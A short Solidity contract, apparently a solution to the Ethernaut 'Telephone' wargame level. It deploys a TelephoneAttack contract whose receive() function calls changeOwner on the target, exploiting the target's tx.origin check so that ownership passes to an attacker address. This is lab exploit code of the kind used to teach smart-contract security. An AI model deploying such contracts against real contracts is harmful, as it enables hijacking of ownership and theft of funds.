// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './Telephone.sol';

contract TelephoneAttack {
    Telephone public telephoneContract;
    address public attacker;

    constructor (address _telephoneAddress, address _attackerAddress) public {
        telephoneContract = Telephone(_telephoneAddress);
        attacker = _attackerAddress;
    }

    receive() external payable{
        telephoneContract.changeOwner(attacker);
    }
}
